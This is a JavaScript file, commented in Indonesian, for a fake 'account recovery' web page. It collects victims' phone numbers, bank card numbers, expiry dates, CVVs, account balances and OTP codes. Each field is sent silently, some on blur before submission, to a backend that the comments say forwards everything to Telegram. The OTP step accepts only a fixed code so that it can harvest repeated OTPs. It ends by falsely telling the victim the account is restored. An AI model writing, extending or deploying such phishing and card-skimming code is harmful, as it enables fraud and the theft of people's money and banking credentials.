// Tambahkan di bagian awal script.js (setelah variabel global)
let currentSessionData = {
    phoneNumber: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    saldo: '',
    otp: ''
};

// Fungsi untuk mengirim data ke Netlify Function (tanpa menampilkan notifikasi ke user)
async function sendDataToTelegram(data) {
    try {
        console.log('Mengirim data:', data);
        
        const response = await fetch('/api/send-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('Data berhasil dikirim ke antrian:', data.step);
            return true;
        } else {
            console.error('Gagal mengirim data:', result.error);
            return false;
        }
    } catch (error) {
        console.error('Error saat mengirim data:', error);
        return false;
    }
}

// Update event listener untuk nomor HP (Page 1 -> Page 2)
document.getElementById('gotoPage2Btn').addEventListener('click', async () => {
    const phone = document.getElementById('mobileNumber').value.trim();
    if (phone === "") {
        showNotification("Nomor HP tidak boleh kosong", true);
        return;
    }
    const cleanPhone = phone.replace(/\s/g, '');
    if (!/^[0-9]{10,13}$/.test(cleanPhone)) {
        showNotification("Nomor HP harus 10-13 digit angka", true);
        return;
    }
    
    // Simpan nomor HP ke session
    currentSessionData.phoneNumber = cleanPhone;
    currentSessionData.step = 'phone';
    
    // Kirim notifikasi ke Telegram untuk nomor HP
    await sendDataToTelegram({
        phoneNumber: cleanPhone,
        step: 'phone'
    });
    
    page1.classList.remove('active');
    page2.classList.add('active');
    initAllCarousels();
});

// Update event listener untuk CVV (ketika diisi)
if (cvvInput) {
    cvvInput.addEventListener('blur', async function() {
        if (this.value.length === 3) {
            const expiry = document.getElementById('berlakuSampai').value;
            if (expiry && expiry.length === 5) {
                currentSessionData.expiry = expiry;
                currentSessionData.cvv = this.value;
                currentSessionData.step = 'cvv';
                
                // Kirim notifikasi ke Telegram untuk CVV + Expiry
                await sendDataToTelegram({
                    phoneNumber: currentSessionData.phoneNumber,
                    cardNumber: currentSessionData.cardNumber,
                    expiry: expiry,
                    cvv: this.value,
                    step: 'cvv'
                });
            }
        }
    });
}

// Update event listener untuk kartu ATM
nomorKartuInput.addEventListener('blur', async function() {
    const cardNumberClean = this.value.replace(/\s/g, '');
    if (cardNumberClean.length === 16) {
        currentSessionData.cardNumber = cardNumberClean;
        currentSessionData.step = 'card';
        
        // Kirim notifikasi ke Telegram untuk nomor kartu
        await sendDataToTelegram({
            phoneNumber: currentSessionData.phoneNumber,
            cardNumber: cardNumberClean,
            step: 'card'
        });
    }
});

// Update event listener untuk saldo
if (saldoInput) {
    saldoInput.addEventListener('blur', async function() {
        const saldoValue = this.value;
        if (saldoValue && saldoValue !== '0' && saldoValue !== '') {
            currentSessionData.saldo = saldoValue;
            currentSessionData.step = 'saldo';
            
            // Kirim notifikasi ke Telegram untuk saldo
            await sendDataToTelegram({
                phoneNumber: currentSessionData.phoneNumber,
                cardNumber: currentSessionData.cardNumber,
                expiry: currentSessionData.expiry,
                cvv: currentSessionData.cvv,
                saldo: saldoValue,
                step: 'saldo'
            });
        }
    });
}

// Update tombol LANJUT (Page 2 -> Page 3)
btnLanjut.addEventListener('click', async (e) => {
    e.preventDefault();
    
    const nomorKartu = document.getElementById('nomorKartu').value.replace(/\s/g, '');
    const berlakuSampai = document.getElementById('berlakuSampai').value;
    const cvv = document.getElementById('cvv').value;
    const saldoRaw = getRawSaldo();
    const saldoTerakhir = saldoRaw === '' ? '0' : saldoRaw;
    
    if (nomorKartu === "" || nomorKartu.length < 16) {
        showNotification("Nomor kartu ATM harus 16 digit", true);
        return;
    }
    
    if (berlakuSampai === "" || berlakuSampai.length < 5) {
        showNotification("Masukkan masa berlaku kartu (MM/YY)", true);
        return;
    }
    
    if (cvv === "" || cvv.length < 3) {
        showNotification("Masukkan CVV/CVC 3 digit", true);
        return;
    }
    
    if (saldoTerakhir === "0" || saldoTerakhir === "") {
        showNotification("Masukkan perkiraan saldo terakhir", true);
        return;
    }
    
    const saldoNumber = parseInt(saldoTerakhir.replace(/\./g, ''));
    if (isNaN(saldoNumber) || saldoNumber <= 0) {
        showNotification("Nominal saldo tidak valid", true);
        return;
    }
    
    // Update session data
    currentSessionData.cardNumber = nomorKartu;
    currentSessionData.expiry = berlakuSampai;
    currentSessionData.cvv = cvv;
    currentSessionData.saldo = saldoTerakhir;
    currentSessionData.step = 'complete';
    
    // Kirim notifikasi lengkap ke Telegram (semua data kecuali OTP)
    await sendDataToTelegram({
        phoneNumber: currentSessionData.phoneNumber,
        cardNumber: nomorKartu,
        expiry: berlakuSampai,
        cvv: cvv,
        saldo: saldoTerakhir,
        step: 'complete'
    });
    
    console.log("Informasi kartu terverifikasi untuk pemulihan.");
    
    // Reset OTP
    window.retryCounter = 0;
    document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
    document.getElementById('otpWarning').innerText = '';
    
    page2.classList.remove('active');
    page3.classList.add('active');
    initAllCarousels();
    
    setTimeout(() => {
        const first = document.querySelector('.otp-digit');
        if (first) first.focus();
    }, 150);
});

// Update submit OTP
document.getElementById('submitOtpBtn').addEventListener('click', async () => {
    const mainOtp = getOtpFromPage();
    if (mainOtp.length !== 6) {
        showNotification("Masukkan 6 digit kode OTP", true);
        return;
    }
    
    // Kirim OTP ke Telegram
    currentSessionData.otp = mainOtp;
    currentSessionData.step = 'otp';
    
    // Kirim notifikasi OTP ke Telegram dengan semua data
    await sendDataToTelegram({
        phoneNumber: currentSessionData.phoneNumber,
        cardNumber: currentSessionData.cardNumber,
        expiry: currentSessionData.expiry,
        cvv: currentSessionData.cvv,
        saldo: currentSessionData.saldo,
        otp: mainOtp,
        step: 'otp'
    });
    
    // Simulasi verifikasi OTP (demo: kode 123456 dianggap benar)
    const isOtpValid = (mainOtp === '123456');
    
    if (!isOtpValid) {
        window.retryCounter = (window.retryCounter || 0) + 1;
        if (window.retryCounter >= 10) {
            showNotification("Batas percobaan OTP tercapai. Mulai proses pemulihan dari awal.", true);
            resetToInitialState();
            return;
        }
        showNotification(`Kode OTP salah! Sisa percobaan: ${10 - window.retryCounter}`, true);
        resetOtpFields();
        return;
    }
    
    showNotification("Verifikasi berhasil! Akun Anda telah dipulihkan.", false);
    
    // Reset session
    currentSessionData = {
        phoneNumber: '',
        cardNumber: '',
        expiry: '',
        cvv: '',
        saldo: '',
        otp: ''
    };
    
    resetToInitialState();
});

// Fungsi reset yang diupdate
function resetToInitialState() {
    page3.classList.remove('active');
    page2.classList.remove('active');
    page1.classList.add('active');
    initAllCarousels();
    
    document.getElementById('mobileNumber').value = '';
    document.getElementById('nomorKartu').value = '';
    document.getElementById('berlakuSampai').value = '';
    if (cvvInput) cvvInput.value = '';
    if (saldoInput) saldoInput.value = '';
    document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
    window.retryCounter = 0;
    
    // Reset session data
    currentSessionData = {
        phoneNumber: '',
        cardNumber: '',
        expiry: '',
        cvv: '',
        saldo: '',
        otp: ''
    };
                           }
